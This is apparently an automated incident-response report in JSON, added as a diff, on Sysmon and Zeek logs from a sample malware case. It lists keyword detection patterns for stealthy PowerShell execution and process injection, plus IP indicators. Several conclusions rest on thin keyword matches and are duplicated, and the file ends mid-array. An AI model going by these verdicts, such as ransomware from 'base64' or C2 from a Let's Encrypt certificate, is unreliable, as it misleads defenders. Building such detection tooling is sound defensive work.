@@ -1,0 +1,2333 @@
+{
+  "nexus_ir_version": "4.0.0-langgraph",
+  "session_id": "20260523_025749",
+  "investigation_complete": true,
+  "langgraph_iterations": 1,
+  "executive_summary": {
+    "threat_level": "CRITICAL",
+    "threat_score": 100,
+    "case_priority": "CRITICAL",
+    "total_files_analyzed": 6,
+    "attack_patterns_detected": 3,
+    "unique_ips_found": 2,
+    "findings_validated": 25,
+    "findings_rejected": 0,
+    "overall_confidence": "HIGH",
+    "auto_remediated": 0
+  },
+  "attack_patterns": [
+    {
+      "type": "attack_pattern",
+      "pattern": "RANSOMWARE_OR_MALWARE",
+      "confidence": "CRITICAL",
+      "evidence_keywords": [
+        "powershell",
+        "base64"
+      ],
+      "description": "Malware or ransomware execution detected",
+      "mitre_technique": "T1486 - Data Encrypted for Impact",
+      "base_score": 90,
+      "agent": "CorrelationAgent",
+      "iteration": 1,
+      "timestamp": "2026-05-23T02:57:52.082949+00:00",
+      "traceable": true
+    },
+    {
+      "type": "attack_pattern",
+      "pattern": "PROCESS_INJECTION",
+      "confidence": "CRITICAL",
+      "evidence_keywords": [
+        "0x1FFFFF"
+      ],
+      "description": "Process injection confirmed via GrantedAccess=0x1FFFFF",
+      "mitre_technique": "T1055 - Process Injection",
+      "base_score": 97,
+      "agent": "CorrelationAgent",
+      "iteration": 1,
+      "timestamp": "2026-05-23T02:57:52.083035+00:00",
+      "traceable": true
+    },
+    {
+      "type": "attack_pattern",
+      "pattern": "POWERSHELL_OBFUSCATION",
+      "confidence": "CRITICAL",
+      "evidence_keywords": [
+        "hidden",
+        "windowstyle",
+        "executionpolicy",
+        "bypass"
+      ],
+      "description": "Obfuscated PowerShell execution with stealth flags",
+      "mitre_technique": "T1059.001 - PowerShell / T1027 - Obfuscation",
+      "base_score": 90,
+      "agent": "CorrelationAgent",
+      "iteration": 1,
+      "timestamp": "2026-05-23T02:57:52.083093+00:00",
+      "traceable": true
+    }
+  ],
+  "ip_correlations": [
+    {
+      "type": "ip_seen_in_evidence",
+      "ip": "104.21.55.12",
+      "seen_by_agents": [
+        "LogAgent"
+      ],
+      "significance": "HIGH",
+      "description": "Regex-verified IoC: 104.21.55.12",
+      "agent": "CorrelationAgent",
+      "iteration": 1,
+      "timestamp": "2026-05-23T02:57:52.083246+00:00",
+      "traceable": true
+    },
+    {
+      "type": "ip_seen_in_evidence",
+      "ip": "192.168.1.105",
+      "seen_by_agents": [
+        "LogAgent"
+      ],
+      "significance": "HIGH",
+      "description": "Regex-verified IoC: 192.168.1.105",
+      "agent": "CorrelationAgent",
+      "iteration": 1,
+      "timestamp": "2026-05-23T02:57:52.083255+00:00",
+      "traceable": true
+    }
+  ],
+  "timeline": [
+    {
+      "agent": "TriageAgent",
+      "type": "evidence_detected",
+      "timestamp": "2026-05-23T02:57:49.918493+00:00",
+      "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log"
+    },
+    {
+      "agent": "TriageAgent",
+      "type": "evidence_detected",
+      "timestamp": "2026-05-23T02:57:49.918575+00:00",
+      "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json"
+    },
+    {
+      "agent": "TriageAgent",
+      "type": "dynamic_priority_escalation",
+      "timestamp": "2026-05-23T02:57:49.919603+00:00",
+      "artifact": "triage_scan"
+    },
+    {
+      "agent": "LogAgent",
+      "type": "suspicious_log_activity",
+      "timestamp": "2026-05-23T02:57:50.504653+00:00",
+      "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json"
+    },
+    {
+      "agent": "LogAgent",
+      "type": "suspicious_log_activity",
+      "timestamp": "2026-05-23T02:57:51.104947+00:00",
+      "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json"
+    },
+    {
+      "agent": "LogAgent",
+      "type": "suspicious_log_activity",
+      "timestamp": "2026-05-23T02:57:51.735080+00:00",
+      "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json"
+    },
+    {
+      "agent": "MemoryAgent",
+      "type": "suspicious_process_tree",
+      "timestamp": "2026-05-23T02:57:52.064580+00:00",
+      "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json"
+    },
+    {
+      "agent": "MemoryAgent",
+      "type": "suspicious_process_tree",
+      "timestamp": "2026-05-23T02:57:52.065012+00:00",
+      "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log"
+    },
+    {
+      "agent": "NetworkAgent",
+      "type": "tls_anomaly",
+      "timestamp": "2026-05-23T02:57:52.074401+00:00",
+      "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json"
+    },
+    {
+      "agent": "NetworkAgent",
+      "type": "tls_anomaly",
+      "timestamp": "2026-05-23T02:57:52.075741+00:00",
+      "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log"
+    }
+  ],
+  "validated_findings": [
+    {
+      "finding": {
+        "type": "evidence_detected",
+        "category": "log_files",
+        "count": 3,
+        "files": [
+          "sysmon_execution.log",
+          "sysmon_injection.log",
+          "zeek_network.log"
+        ],
+        "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log",
+        "agent": "TriageAgent",
+        "iteration": 1,
+        "timestamp": "2026-05-23T02:57:49.918493+00:00",
+        "traceable": true
+      },
+      "source_agent": "TriageAgent",
+      "valid": true,
+      "confidence": 70,
+      "issues": [],
+      "verification_steps": [
+        "Artifact verified: sysmon_execution.log",
+        "File on disk: sysmon_execution.log",
+        "Timestamp present"
+      ]
+    },
+    {
+      "finding": {
+        "type": "evidence_detected",
+        "category": "json_artifacts",
+        "count": 3,
+        "files": [
+          "sysmon_execution.json",
+          "sysmon_injection.json",
+          "zeek_network.json"
+        ],
+        "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+        "agent": "TriageAgent",
+        "iteration": 1,
+        "timestamp": "2026-05-23T02:57:49.918575+00:00",
+        "traceable": true
+      },
+      "source_agent": "TriageAgent",
+      "valid": true,
+      "confidence": 70,
+      "issues": [],
+      "verification_steps": [
+        "Artifact verified: sysmon_execution.json",
+        "File on disk: sysmon_execution.json",
+        "Timestamp present"
+      ]
+    },
+    {
+      "finding": {
+        "type": "dynamic_priority_escalation",
+        "reason": "Critical keywords found in evidence",
+        "keywords": [
+          "powershell",
+          "executionpolicy bypass",
+          "windowstyle hidden",
+          "base64",
+          "0x1fffff"
+        ],
+        "artifact": "triage_scan",
+        "priority_set": "CRITICAL",
+        "agent": "TriageAgent",
+        "iteration": 1,
+        "timestamp": "2026-05-23T02:57:49.919603+00:00",
+        "traceable": true
+      },
+      "source_agent": "TriageAgent",
+      "valid": true,
+      "confidence": 70,
+      "issues": [],
+      "verification_steps": [
+        "Triage-level finding \u2014 acceptable",
+        "Timestamp present"
+      ]
+    },
+    {
+      "finding": {
+        "type": "suspicious_log_activity",
+        "file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+        "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+        "file_hash": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+        "keywords_matched": [
+          "powershell",
+          "base64",
+          "executionpolicy",
+          "windowstyle",
+          "hidden",
+          "bypass",
+          "wmi"
+        ],
+        "total_hits": 8,
+        "agent": "LogAgent",
+        "iteration": 1,
+        "timestamp": "2026-05-23T02:57:50.504653+00:00",
+        "traceable": true
+      },
+      "source_agent": "LogAgent",
+      "valid": true,
+      "confidence": 100,
+      "issues": [],
+      "verification_steps": [
+        "Artifact verified: sysmon_execution.json",
+        "File on disk: sysmon_execution.json",
+        "Keywords: ['powershell', 'base64', 'executionpolicy', 'windowstyle', 'hidden', 'bypass', 'wmi']",
+        "Timestamp present"
+      ]
+    },
+    {
+      "finding": {
+        "type": "suspicious_log_activity",
+        "file": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json",
+        "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json",
+        "file_hash": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+        "keywords_matched": [
+          "powershell",
+          "0x1fffff",
+          "svchost"
+        ],
+        "total_hits": 5,
+        "agent": "LogAgent",
+        "iteration": 1,
+        "timestamp": "2026-05-23T02:57:51.104947+00:00",
+        "traceable": true
+      },
+      "source_agent": "LogAgent",
+      "valid": true,
+      "confidence": 100,
+      "issues": [],
+      "verification_steps": [
+        "Artifact verified: sysmon_injection.json",
+        "File on disk: sysmon_injection.json",
+        "Keywords: ['powershell', '0x1fffff', 'svchost']",
+        "Timestamp present"
+      ]
+    },
+    {
+      "finding": {
+        "type": "suspicious_log_activity",
+        "file": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json",
+        "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json",
+        "file_hash": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+        "keywords_matched": [
+          "let's encrypt"
+        ],
+        "total_hits": 1,
+        "agent": "LogAgent",
+        "iteration": 1,
+        "timestamp": "2026-05-23T02:57:51.735080+00:00",
+        "traceable": true
+      },
+      "source_agent": "LogAgent",
+      "valid": true,
+      "confidence": 100,
+      "issues": [],
+      "verification_steps": [
+        "Artifact verified: zeek_network.json",
+        "File on disk: zeek_network.json",
+        "Keywords: [\"let's encrypt\"]",
+        "Timestamp present"
+      ]
+    },
+    {
+      "finding": {
+        "type": "suspicious_process_tree",
+        "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+        "file_hash": "619304a909d0de97",
+        "parent": "wmiprvse.exe",
+        "child": "powershell.exe",
+        "pair": "wmiprvse.exe -> powershell.exe",
+        "severity": "HIGH",
+        "mitre": "T1059 - Command and Scripting Interpreter",
+        "agent": "MemoryAgent",
+        "iteration": 1,
+        "timestamp": "2026-05-23T02:57:52.064580+00:00",
+        "traceable": true
+      },
+      "source_agent": "MemoryAgent",
+      "valid": true,
+      "confidence": 70,
+      "issues": [],
+      "verification_steps": [
+        "Artifact verified: sysmon_execution.json",
+        "File on disk: sysmon_execution.json",
+        "Timestamp present"
+      ]
+    },
+    {
+      "finding": {
+        "type": "suspicious_process_tree",
+        "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log",
+        "file_hash": "619304a909d0de97",
+        "parent": "wmiprvse.exe",
+        "child": "powershell.exe",
+        "pair": "wmiprvse.exe -> powershell.exe",
+        "severity": "HIGH",
+        "mitre": "T1059 - Command and Scripting Interpreter",
+        "agent": "MemoryAgent",
+        "iteration": 1,
+        "timestamp": "2026-05-23T02:57:52.065012+00:00",
+        "traceable": true
+      },
+      "source_agent": "MemoryAgent",
+      "valid": true,
+      "confidence": 70,
+      "issues": [],
+      "verification_steps": [
+        "Artifact verified: sysmon_execution.log",
+        "File on disk: sysmon_execution.log",
+        "Timestamp present"
+      ]
+    },
+    {
+      "finding": {
+        "type": "tls_anomaly",
+        "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json",
+        "file_hash": "a1f2ebf54ab8ff40",
+        "indicator": "let's encrypt",
+        "evidence": [
+          "\"issuer\": \"CN=Let's Encrypt Authority X3, O=Let's Encrypt, C=US\","
+        ],
+        "severity": "HIGH",
+        "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+        "agent": "NetworkAgent",
+        "iteration": 1,
+        "timestamp": "2026-05-23T02:57:52.074401+00:00",
+        "traceable": true
+      },
+      "source_agent": "NetworkAgent",
+      "valid": true,
+      "confidence": 70,
+      "issues": [],
+      "verification_steps": [
+        "Artifact verified: zeek_network.json",
+        "File on disk: zeek_network.json",
+        "Timestamp present"
+      ]
+    },
+    {
+      "finding": {
+        "type": "tls_anomaly",
+        "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log",
+        "file_hash": "a1f2ebf54ab8ff40",
+        "indicator": "let's encrypt",
+        "evidence": [
+          "\"issuer\": \"CN=Let's Encrypt Authority X3, O=Let's Encrypt, C=US\","
+        ],
+        "severity": "HIGH",
+        "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+        "agent": "NetworkAgent",
+        "iteration": 1,
+        "timestamp": "2026-05-23T02:57:52.075741+00:00",
+        "traceable": true
+      },
+      "source_agent": "NetworkAgent",
+      "valid": true,
+      "confidence": 70,
+      "issues": [],
+      "verification_steps": [
+        "Artifact verified: zeek_network.log",
+        "File on disk: zeek_network.log",
+        "Timestamp present"
+      ]
+    },
+    {
+      "pattern": "RANSOMWARE_OR_MALWARE",
+      "valid": true,
+      "confidence": 100,
+      "issues": [],
+      "verification_steps": [
+        "Supported by: ['powershell', 'base64']",
+        "MITRE: T1486 - Data Encrypted for Impact"
+      ]
+    },
+    {
+      "pattern": "PROCESS_INJECTION",
+      "valid": true,
+      "confidence": 100,
+      "issues": [],
+      "verification_steps": [
+        "Supported by: ['0x1FFFFF']",
+        "MITRE: T1055 - Process Injection"
+      ]
+    },
+    {
+      "pattern": "POWERSHELL_OBFUSCATION",
+      "valid": true,
+      "confidence": 100,
+      "issues": [],
+      "verification_steps": [
+        "Supported by: ['hidden', 'windowstyle', 'executionpolicy', 'bypass']",
+        "MITRE: T1059.001 - PowerShell / T1027 - Obfuscation"
+      ]
+    },
+    {
+      "ip": "104.21.55.12",
+      "valid": true,
+      "confidence": 90,
+      "issue": null
+    },
+    {
+      "ip": "192.168.1.105",
+      "valid": true,
+      "confidence": 90,
+      "issue": null
+    },
+    {
+      "type": "high_signal_signature",
+      "description": "PROCESS_ALL_ACCESS on system process \u2014 definitive process injection",
+      "mitre": "T1055 - Process Injection",
+      "score": 95,
+      "valid": true,
+      "confidence": 95
+    },
+    {
+      "type": "high_signal_signature",
+      "description": "PowerShell stealth execution flags \u2014 malware loader signature",
+      "mitre": "T1059.001 - PowerShell",
+      "score": 88,
+      "valid": true,
+      "confidence": 88
+    },
+    {
+      "type": "high_signal_signature",
+      "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+      "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+      "score": 92,
+      "valid": true,
+      "confidence": 92
+    },
+    {
+      "type": "high_signal_signature",
+      "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+      "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+      "score": 92,
+      "valid": true,
+      "confidence": 92
+    },
+    {
+      "type": "high_signal_signature",
+      "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+      "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+      "score": 92,
+      "valid": true,
+      "confidence": 92
+    },
+    {
+      "type": "high_signal_signature",
+      "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+      "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+      "score": 92,
+      "valid": true,
+      "confidence": 92
+    },
+    {
+      "type": "high_signal_signature",
+      "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+      "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+      "score": 92,
+      "valid": true,
+      "confidence": 92
+    },
+    {
+      "type": "high_signal_signature",
+      "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+      "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+      "score": 92,
+      "valid": true,
+      "confidence": 92
+    },
+    {
+      "type": "high_signal_signature",
+      "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+      "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+      "score": 92,
+      "valid": true,
+      "confidence": 92
+    },
+    {
+      "type": "high_signal_signature",
+      "description": "TLS cert issued by Let's Encrypt for Microsoft-named domain \u2014 typosquatting C2",
+      "mitre": "T1071.001 - Web Protocols / T1568 - Dynamic Resolution",
+      "score": 92,
+      "valid": true,
+      "confidence": 92
+    }
+  ],
+  "rejected_findings": [],
+  "attack_narrative": "A heavily obfuscated PowerShell command was executed on A1B2C3D4-E5F6 (ProcessID 1128) using ExecutionPolicy Bypass and WindowStyle Hidden flags, indicating a fileless malware execution technique designed to evade endpoint detection. The malicious process injected shellcode into a legitimate system process (GrantedAccess=0x1FFFFF) \u2014 this is PROCESS_ALL_ACCESS, a definitive indicator of process injection used to achieve execution within a trusted process and bypass security monitoring. The attack chain represents a complete APT intrusion lifecycle: obfuscated execution, process injection for persistence, and beaconing to external C2 infrastructure \u2014 consistent with a Cobalt Strike or similar commercial implant deployment.",
+  "containment_actions": [
+    "BLOCK IP 104.21.55.12 at perimeter firewall and all internal segment boundaries",
+    "BLOCK IP 192.168.1.105 at perimeter firewall and all internal segment boundaries",
+    "ISOLATE host A1B2C3D4-E5F6 immediately \u2014 disconnect from all network segments",
+    "ISOLATE host DESKTOP-DEV immediately \u2014 disconnect from all network segments",
+    "ISOLATE host DESKTOP-DEV-99A immediately \u2014 disconnect from all network segments",
+    "KILL all suspicious process trees \u2014 terminate injected processes",
+    "DUMP memory of svchost.exe instances for forensic analysis",
+    "ENABLE PowerShell ScriptBlock logging (Event 4104) across all endpoints",
+    "ENFORCE Constrained Language Mode for PowerShell enterprise-wide",
+    "REVIEW Windows Defender AMSI logs for bypass attempts",
+    "DEPLOY EDR memory scanning across all endpoints immediately",
+    "ENABLE Windows Credential Guard to prevent credential extraction",
+    "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+    "BLOCK all outbound connections to domains with mismatched certificate issuers",
+    "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+    "BLOCK all outbound connections to domains with mismatched certificate issuers",
+    "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+    "BLOCK all outbound connections to domains with mismatched certificate issuers",
+    "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+    "BLOCK all outbound connections to domains with mismatched certificate issuers",
+    "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+    "BLOCK all outbound connections to domains with mismatched certificate issuers",
+    "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+    "BLOCK all outbound connections to domains with mismatched certificate issuers",
+    "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+    "BLOCK all outbound connections to domains with mismatched certificate issuers",
+    "REVIEW all TLS connections \u2014 audit certificate issuers for anomalies",
+    "BLOCK all outbound connections to domains with mismatched certificate issuers",
+    "PRESERVE all Sysmon, network, and endpoint logs for legal/forensic proceedings",
+    "NOTIFY CISO and legal team \u2014 assess breach notification obligations"
+  ],
+  "extracted_entities": {
+    "ipv4_addresses": [
+      "104.21.55.12",
+      "192.168.1.105"
+    ],
+    "sha256_hashes": [],
+    "md5_hashes": [],
+    "base64_strings": [
+      "K8jcSMwtyEnVS8/IzMlJTE7VyyxJ1UtJ0UvOT0lN1stNzMzRy0..."
+    ],
+    "decoded_payloads": [],
+    "file_paths": [],
+    "hostnames": [
+      "A1B2C3D4-E5F6",
+      "DESKTOP-DEV",
+      "DESKTOP-DEV-99A"
+    ],
+    "usernames": [],
+    "process_ids": [
+      "1128",
+      "4192",
+      "912"
+    ],
+    "granted_access": [
+      "0x1FFFFF"
+    ],
+    "domains": []
+  },
+  "temporal_sequences": [
+    {
+      "type": "temporal_sequence",
+      "pattern": "FULL_INJECTION_CHAIN",
+      "confidence": "CRITICAL",
+      "description": "Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window",
+      "mitre_technique": "T1055 - Process Injection / T1071 - C2 Communication",
+      "events": [
+        "EventID:1 Process Execution",
+        "EventID:10 Process Access",
+        "EventID:8 Remote Thread Creation",
+        "Network C2 Beacon"
+      ],
+      "base_score": 97,
+      "multiplier": 3.5,
+      "agent": "CorrelationAgent",
+      "iteration": 1,
+      "timestamp": "2026-05-23T02:57:52.083127+00:00",
+      "traceable": true
+    },
+    {
+      "type": "temporal_sequence",
+      "pattern": "FULL_INJECTION_CHAIN",
+      "confidence": "CRITICAL",
+      "description": "Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window",
+      "mitre_technique": "T1055 - Process Injection / T1071 - C2 Communication",
+      "events": [
+        "EventID:1 Process Execution",
+        "EventID:10 Process Access",
+        "EventID:8 Remote Thread Creation",
+        "Network C2 Beacon"
+      ],
+      "base_score": 97,
+      "multiplier": 3.5,
+      "agent": "CorrelationAgent",
+      "iteration": 1,
+      "timestamp": "2026-05-23T02:57:52.083158+00:00",
+      "traceable": true
+    },
+    {
+      "type": "temporal_sequence",
+      "pattern": "FULL_INJECTION_CHAIN",
+      "confidence": "CRITICAL",
+      "description": "Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window",
+      "mitre_technique": "T1055 - Process Injection / T1071 - C2 Communication",
+      "events": [
+        "EventID:1 Process Execution",
+        "EventID:10 Process Access",
+        "EventID:8 Remote Thread Creation",
+        "Network C2 Beacon"
+      ],
+      "base_score": 97,
+      "multiplier": 3.5,
+      "agent": "CorrelationAgent",
+      "iteration": 1,
+      "timestamp": "2026-05-23T02:57:52.083190+00:00",
+      "traceable": true
+    },
+    {
+      "type": "temporal_sequence",
+      "pattern": "FULL_INJECTION_CHAIN",
+      "confidence": "CRITICAL",
+      "description": "Execution -> Process Injection -> Remote Thread -> C2 Beacon within time window",
+      "mitre_technique": "T1055 - Process Injection / T1071 - C2 Communication",
+      "events": [
+        "EventID:1 Process Execution",
+        "EventID:10 Process Access",
+        "EventID:8 Remote Thread Creation",
+        "Network C2 Beacon"
+      ],
+      "base_score": 97,
+      "multiplier": 3.5,
+      "agent": "CorrelationAgent",
+      "iteration": 1,
+      "timestamp": "2026-05-23T02:57:52.083222+00:00",
+      "traceable": true
+    }
+  ],
+  "chain_of_custody": {
+    "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json": {
+      "sha256": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+      "timestamp": "2026-05-23T02:57:52.069252+00:00",
+      "size_bytes": 914
+    },
+    "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log": {
+      "sha256": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+      "timestamp": "2026-05-23T02:57:52.070387+00:00",
+      "size_bytes": 914
+    },
+    "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json": {
+      "sha256": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+      "timestamp": "2026-05-23T02:57:52.071331+00:00",
+      "size_bytes": 915
+    },
+    "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.log": {
+      "sha256": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+      "timestamp": "2026-05-23T02:57:52.072258+00:00",
+      "size_bytes": 915
+    },
+    "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json": {
+      "sha256": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+      "timestamp": "2026-05-23T02:57:52.073192+00:00",
+      "size_bytes": 1188
+    },
+    "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log": {
+      "sha256": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+      "timestamp": "2026-05-23T02:57:52.074577+00:00",
+      "size_bytes": 1188
+    }
+  },
+  "execution_trace": [
+    {
+      "timestamp": "2026-05-23T02:57:49.913973+00:00",
+      "level": "AGENT",
+      "message": "NODE: Triage \u2014 examining evidence...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:49.919847+00:00",
+      "level": "DONE",
+      "message": "Triage done \u2014 Priority: CRITICAL, Files: 6",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:49.922624+00:00",
+      "level": "AGENT",
+      "message": "NODE: Log Analysis \u2014 hunting IoCs...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:52.044818+00:00",
+      "level": "DONE",
+      "message": "Log analysis done \u2014 3 findings",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:52.050070+00:00",
+      "level": "AGENT",
+      "message": "NODE: Disk Analysis -- scanning file system artifacts...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:52.060524+00:00",
+      "level": "DONE",
+      "message": "Disk analysis done -- 0 hit(s), priority: LOW",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:52.063576+00:00",
+      "level": "AGENT",
+      "message": "NODE: Memory Analysis -- hunting injection and credential dumps...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:52.066604+00:00",
+      "level": "DONE",
+      "message": "Memory analysis done -- 2 hit(s), priority: HIGH",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:52.068647+00:00",
+      "level": "AGENT",
+      "message": "NODE: Network Analysis -- detecting C2, exfil, tunneling...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:52.075917+00:00",
+      "level": "DONE",
+      "message": "Network analysis done -- 2 hit(s), priority: HIGH",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:52.078083+00:00",
+      "level": "AGENT",
+      "message": "NODE: Correlation \u2014 cross-referencing findings...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:52.083751+00:00",
+      "level": "DONE",
+      "message": "Correlation done \u2014 Threat: CRITICAL (100/100)",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:52.085715+00:00",
+      "level": "AGENT",
+      "message": "NODE: Correction \u2014 devil advocate pass (iteration 0)...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:57:52.321414+00:00",
+      "level": "DONE",
+      "message": "Correction done \u2014 100.0% accuracy, 25 validated",
+      "iteration": 0
+    }
+  ],
+  "agent_reports": {
+    "triage": {
+      "status": "COMPLETE",
+      "agent": "TriageAgent",
+      "case_path": "/data/data/com.termux/files/home/cases/obfuscated_malware",
+      "priority": "CRITICAL",
+      "keyword_hits": {
+        "critical_keywords_found": [
+          "powershell",
+          "executionpolicy bypass",
+          "windowstyle hidden",
+          "base64",
+          "0x1fffff"
+        ],
+        "high_keywords_found": [
+          "wmi",
+          "svchost"
+        ]
+      },
+      "all_files": [
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log",
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json",
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.log",
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json",
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log"
+      ],
+      "evidence_types": {
+        "disk_images": [],
+        "memory_dumps": [],
+        "log_files": [
+          "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log",
+          "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.log",
+          "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log"
+        ],
+        "network_captures": [],
+        "registry_files": [],
+        "json_artifacts": [
+          "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json",
+          "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json",
+          "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json"
+        ],
+        "csv_data": [],
+        "unknown": []
+      },
+      "total_files": 6,
+      "investigation_plan": [
+        {
+          "agent": "LogAgent",
+          "reason": "6 text artifact(s) detected",
+          "priority": 1
+        },
+        {
+          "agent": "CorrelationAgent",
+          "reason": "Always runs",
+          "priority": 5
+        },
+        {
+          "agent": "CorrectionAgent",
+          "reason": "Always runs",
+          "priority": 6
+        }
+      ],
+      "file_hashes": {
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.json": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log": "619304a909d0de9741ac108a2ac53e2d366788677f5f7b66c59bdd492bb6a786",
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.json": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_injection.log": "670fa5d537a5337b60c444b935c93dbcb1129f404bcd8fef7d95d15b19246d00",
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.json": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1",
+        "/data/data/com.termux/files/home/cases/obfuscated_malware/zeek_network.log": "a1f2ebf54ab8ff4069e38a67cf5e34e1fcec121526753060a5dc2fbcee5fbea1"
+      },
+      "findings": [
+        {
+          "type": "evidence_detected",
+          "category": "log_files",
+          "count": 3,
+          "files": [
+            "sysmon_execution.log",
+            "sysmon_injection.log",
+            "zeek_network.log"
+          ],
+          "artifact": "/data/data/com.termux/files/home/cases/obfuscated_malware/sysmon_execution.log",
+          "agent": "TriageAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:57:49.918493+00:00",
+          "traceable": true
+        },
+        {
+          "type": "evidence_detected",
+          "category": "json_artifacts",
+          "count": 3,
+          "files": [
+            "sysmon_execution.json",
+            "sysmon_injection.json",
